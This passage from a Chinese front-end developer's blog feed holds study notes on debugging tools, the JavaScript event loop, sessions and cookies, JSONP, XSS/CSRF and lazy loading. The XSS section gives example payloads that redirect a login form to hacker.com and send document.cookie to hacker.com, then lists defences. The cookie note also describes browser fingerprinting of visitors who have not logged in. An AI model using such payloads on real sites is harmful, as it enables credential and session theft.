<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="external">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="external">相关链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;fiddler-使用&quot;&gt;&lt;a href=&quot;#fiddler-使用&quot; class=&quot;headerlink&quot; title=&quot;fiddler 使用&quot;&gt;&lt;/a&gt;fiddler 使用&lt;/h1&gt;&lt;p&gt;浏览器向服务器发送请求的拦截器&lt;/p&gt;
&lt;h2 id=&quot;statistic&quot;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于事件循环event-loop</title>
    <link href="http://yoohannah.github.io/post/knowledge/eventloop.html"/>
    <id>http://yoohannah.github.io/post/knowledge/eventloop.html</id>
    <published>2018-01-01T13:47:15.000Z</published>
    <updated>2018-01-21T13:38:02.447Z</updated>
    
    <content type="html"><![CDATA[<h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="external">相关链接</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">process.nextTick(() =&gt; &#123;</div><div class="line">  console.log(&apos;nextTick&apos;)</div><div class="line">&#125;)</div><div class="line">Promise.resolve()</div><div class="line">  .then(() =&gt; &#123;</div><div class="line">    console.log(&apos;then&apos;)</div><div class="line">  &#125;)</div><div class="line">setImmediate(() =&gt; &#123;</div><div class="line">  console.log(&apos;setImmediate&apos;)</div><div class="line">&#125;)</div><div class="line">console.log(&apos;end&apos;)</div><div class="line"></div><div class="line">//结果</div><div class="line">end</div><div class="line">nextTick</div><div class="line">then</div><div class="line">setImmediate</div></pre></td></tr></table></figure></p>
<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="external">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="external">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="external">相关</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;js单线程&quot;&gt;&lt;a href=&quot;#js单线程&quot; class=&quot;headerlink&quot; title=&quot;js单线程&quot;&gt;&lt;/a&gt;js单线程&lt;/h1&gt;&lt;p&gt;同一时间只干一件事，干完一件事再干下一件事，&lt;br&gt;如果前一个任务耗时很长，后一个任务也得一直等着&lt;/p&gt;
&lt;p&gt;为
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>session 和cookie</title>
    <link href="http://yoohannah.github.io/post/knowledge/session&amp;cookie.html"/>
    <id>http://yoohannah.github.io/post/knowledge/session&amp;cookie.html</id>
    <published>2017-12-28T00:17:15.000Z</published>
    <updated>2017-12-28T00:17:29.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;正常情况下身份识别&quot;&gt;&lt;a href=&quot;#正常情况下身份识别&quot; class=&quot;headerlink&quot; title=&quot;正常情况下身份识别&quot;&gt;&lt;/a&gt;正常情况下身份识别&lt;/h1&gt;&lt;p&gt;用户提交登录信息，服务器拿到登录信息进行验证之后，&lt;br&gt;为该用户在session表
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于jsonp</title>
    <link href="http://yoohannah.github.io/post/knowledge/jsonp.html"/>
    <id>http://yoohannah.github.io/post/knowledge/jsonp.html</id>
    <published>2017-11-30T23:57:15.000Z</published>
    <updated>2017-12-01T00:00:51.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">js:</div><div class="line">function callbackFunction(result,methodName)&#123;&#125;</div></pre></td></tr></table></figure></p>
<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$.ajax(&#123;</div><div class="line">dataType:&apos;jsonp&apos;,</div><div class="line">data:&apos;id=10&apos;,</div><div class="line">jsonp:&apos;jsonp_callback&apos;,</div><div class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</div><div class="line">success:function(data)&#123;</div><div class="line">//dostuff</div><div class="line">&#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$.get(</div><div class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</div><div class="line">&#123;</div><div class="line">	param: data,  //参数</div><div class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</div><div class="line">  &apos;jsonp&apos;</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</div><div class="line">function(data)&#123; //回调函数</div><div class="line">//dosomething</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于jsonp&quot;&gt;&lt;a href=&quot;#关于jsonp&quot; class=&quot;headerlink&quot; title=&quot;关于jsonp&quot;&gt;&lt;/a&gt;关于jsonp&lt;/h1&gt;&lt;p&gt;是一种json数据的使用模式的名称，&lt;br&gt;获取的资料可以是任意js&lt;/p&gt;
&lt;h1 id=&quot;使用&quot;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>XSS 与 CSRF</title>
    <link href="http://yoohannah.github.io/post/knowledge/XSSCSRF.html"/>
    <id>http://yoohannah.github.io/post/knowledge/XSSCSRF.html</id>
    <published>2017-11-30T23:56:15.000Z</published>
    <updated>2018-03-24T01:24:19.001Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</div><div class="line">//但如果在访问的同时注入攻击代码，如下</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</div><div class="line">//页面代码就会变成</div><div class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</div><div class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</div><div class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</div><div class="line"></div><div class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</div><div class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</div><div class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</div><div class="line">document.write(content);</div><div class="line">document.write(&apos;&gt;&apos;);</div><div class="line">//本次代码注入的方式变为访问</div><div class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</div><div class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</div><div class="line"></div><div class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</div><div class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</div><div class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</div></pre></td></tr></table></figure></p>
<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;</p>
<p>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">相关链接</a></p>
<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;xss-跨站脚本攻击&quot;&gt;&lt;a href=&quot;#xss-跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;xss 跨站脚本攻击&quot;&gt;&lt;/a&gt;xss 跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerli
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>懒加载</title>
    <link href="http://yoohannah.github.io/post/knowledge/lazyload.html"/>
    <id>http://yoohannah.github.io/post/knowledge/lazyload.html</id>
    <published>2017-11-30T23:55:15.000Z</published>
    <updated>2018-01-21T13:42:15.021Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a>lazy</h1><h2 id="图片lazyload"><a href="#图片lazyload" class="headerlink" title="图片lazyload"></a>图片lazyload</h2><p>基本原理是图片image标签的src属性在构建DOM时，先给一特定的默认值，可以是本地图片路径，然后通过监听scroll事件，<br>判断图片所在位置是否在可视屏幕里面，如果在可视屏幕里面，就将要加载的真正图片资源给到image的src属性<br>当然通过判断src的值是否是默认值，就可以知道图片是否已经被加载过，加载过就不会被从新赋值，然后重新加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">function lazyload() &#123;</div><div class="line">              const images = document.getElementsByTagName(&apos;img&apos;)</div><div class="line">              const len = images.length</div><div class="line">              let n = 0</div><div class="line">              return function() &#123;</div><div class="line">                  console.log(1)</div><div class="line">                  const seeHeight = document.documentElement.clientHeight</div><div class="line">                  const scrollTop = document.documentElement.scrollTop || document.body.scrollTop</div><div class="line">                  for (let i = n; i &lt; len; i++) &#123;</div><div class="line">                      if (images[i].offsetTop &lt; seeHeight + scrollTop) &#123; //是否在可视范围</div><div class="line">                          if (images[i].getAttribute(&apos;src&apos;) === &apos;默认图片的url&apos;) &#123;</div><div class="line">                              images[i].src = images[i].getAttribute(&apos;data-src&apos;) //赋值资源链接</div><div class="line">                          &#125;</div><div class="line">                          n = n + 1</div><div class="line">                      &#125;</div><div class="line">                  &#125;</div><div class="line">              &#125;</div><div class="line">          &#125;</div><div class="line">          var loadImages = lazyload()</div><div class="line">          window.onload = function () &#123;</div><div class="line">              loadImages()</div><div class="line">              window.addEventListener(&apos;scroll&apos;, loadImages, false)</div><div class="line">          &#125;</div></pre></td></tr></table></figure></p>
<p>但缺点就是，只要触发了scroll事件，就会去调函数，无论图片有没有被加载，这样就会造成一些没用的调用，所以对此进行改进</p>
<p>改进方式一：使用节流阀（Throttle）</p>
<p>响应函数函数在一定时间内只允许被调用一次,函数能否被执行根据时间来确定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function throttle(fn, delay, atleast) &#123;</div><div class="line">                let timeout = null</div><div class="line">                let startTime = new Date()</div><div class="line">                return function() &#123;</div><div class="line">                    const curTime = new Date()</div><div class="line">                    clearTimeout(timeout) //3，取消限定时间内预约的将来的函数执行,防止多次执行</div><div class="line">                    if (curTime - startTime &gt;= atleast) &#123;//1,超过限定时间，执行一次</div><div class="line">                        fn()</div><div class="line">                        startTime = curTime</div><div class="line">                    &#125; else &#123;</div><div class="line">                        timeout = setTimeout(fn, delay) //2，没超过限定时间，在限定时间内不执行，延续时间到超过限定时间后再执行</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, throttle(loadImages, 500, 1000), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>改进方式二：使用防抖动技术(debounce)</p>
<p>当事件发生时，不会立即激活回调。<br>等待一定的时间并检查相同的事件是否再次触发。<br>如果是，重置定时器，并再次等待。<br>如果在等待期间没有发生相同的事件，等待时间结束后就立即激活回调。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function debounced(fn,delay) &#123;</div><div class="line">  clearTimeout(timeoutID);  // reset timer</div><div class="line">  timeoutID = setTimeout(function() &#123;</div><div class="line">    // wait for some time</div><div class="line">    // and check if event happens again</div><div class="line">    fn()</div><div class="line">  &#125;, delay);</div><div class="line">&#125;;</div><div class="line">var loadImages = lazyload()</div><div class="line">window.onload = function () &#123;</div><div class="line">    loadImages()</div><div class="line">    window.addEventListener(&apos;scroll&apos;, debounced(loadImages, 500), false)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="组件的lazyload"><a href="#组件的lazyload" class="headerlink" title="组件的lazyload"></a>组件的lazyload</h2><p>实现一：AMD模式require实现异步加载模块<br>在AMD模式里面每个模块都会被define包裹，对无序的代码进行有序的模块化定义，目的就是为了使js能够按照一定秩序执行，<br>require模块时，会根据模块之间的依赖关系按顺序加载</p>
<p>实现二：使用require.ensure()方法调用异步模块，配置chunkFilename为异步模块要打包到的地方，webpack打包时，就会根据依赖关系打包成异步加载的模式，在运行时就会异步加载模块</p>
<p>实现三：将组建都标签化后，通过对标签添加是否异步的标志，从而实现对该组件的异步加载</p>
<h1 id="预加载技术"><a href="#预加载技术" class="headerlink" title="预加载技术"></a>预加载技术</h1><p>1.提前加载下一页数据<br>2.加载页面时，尽早发出数据请求，实现页面数据预加载</p>
<h1 id="图片的-base64-编码"><a href="#图片的-base64-编码" class="headerlink" title="图片的 base64 编码"></a>图片的 base64 编码</h1><p>图片的 base64 编码就是可以将一图片数据编码成一串字符串，使用该字符串代替代码中的图像地址<br>图片就可以随着HTML的下载同时下载到本地，不用为了下载图片向服务器发出请求</p>
<p>将图片转化为Base64编码的工具，可以使用线上网站，也可以用以下方法<br>在 chrome 下打开新的标签页，然后把要转化的图片直接拖入浏览器，打开控制台，点 Source，source的内容内容就是图片base64编码</p>
<p>可以看到一个图片的base64编码的字符数量一般是很大的，这样，当把图片编码无论是写到css文件还是html文件，<br>都会因为解析时间过长从而造成渲染速度下降，因此将图片进行base64编码最好的应用场景是如下情况：<br><b>如果图片足够小且因为用处的特殊性无法被制作成雪碧图（CssSprites），在整个网站的复用性很高且基本不会被更新</b></p>
<p><a href="http://www.cnblogs.com/coco1s/p/4375774.html" target="_blank" rel="external">base64 编码</a></p>
<p>Angular会自动为每个拥有作用域的DOM节点加上 ng-scope 类<br>AngularJs的angular.extend()方法可以把一个或多个对象中的方法和属性扩展到一个目的对象中，使得这个对象拥有其他对象相同的方法和属性<br>angular.extends()方法的第一个参数是要被扩展的对象，后面可以传入一个或多个对象</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="优化占位图"><a href="#优化占位图" class="headerlink" title="优化占位图"></a>优化占位图</h2><p>VG元素/提取图片背景色以base64形式直出<br>使用SVG画图形轮廓,再加一个模糊滤镜<br>对图片进行二值化提取剪影</p>
<h2 id="浏览器渲染图片原理"><a href="#浏览器渲染图片原理" class="headerlink" title="浏览器渲染图片原理"></a>浏览器渲染图片原理</h2><p>构建DOM树，遇到img标签加载图片<br>构建样式树，遇到backgroud-img图片不加载<br>构建render树,所有属性都会构建，如果元素有display:none属性,则其子元素不被构建<br>渲染DOM树,仅渲染没有display:none属性的元素，如果发现元素有该属性则不进行渲染;没有被构建的子元素背景图片不会被加载更不会被加载</p>
<p>设置了display:none属性的元素，图片不会渲染出来，但会加载，不管是直接的img属性还是div的背景图片都会被加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;https://cdn-jlsq-img.thy360.com/2e3457ef739c4116847eb359dffcf651.jpg!thumbnail&quot;&gt; //加载</div><div class="line">&lt;div class=&quot;skslsl&quot;&gt;&lt;/div&gt;//加载</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">  .skslsl&#123;</div><div class="line">    background-image:url(&apos;https://cdn-jlsq-img.thy360.com/3aeac46295cb4f15bfb1154692e00c95.JPEG&apos;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&lt;/style&gt;</div></pre></td></tr></table></figure></p>
